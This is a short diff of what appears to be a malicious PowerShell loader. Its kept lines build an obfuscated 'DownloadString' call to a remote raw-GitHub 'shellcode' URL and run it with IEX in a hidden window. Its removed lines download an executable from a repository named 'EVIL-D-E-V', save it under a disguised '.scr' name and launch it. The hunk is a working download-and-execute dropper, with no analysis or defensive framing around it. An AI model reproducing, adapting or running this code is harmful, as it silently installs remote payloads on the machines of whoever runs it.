@@ -98,10 +98,6 @@ $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/sh
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
-$url = "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/XClienta.exe"
-$output = "$dir\Updatecli4mt.scr"
-Invoke-WebRequest -Uri $url -OutFile $output
-Start-Process $output
 
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 Add-Type -AssemblyName System.Net.Http
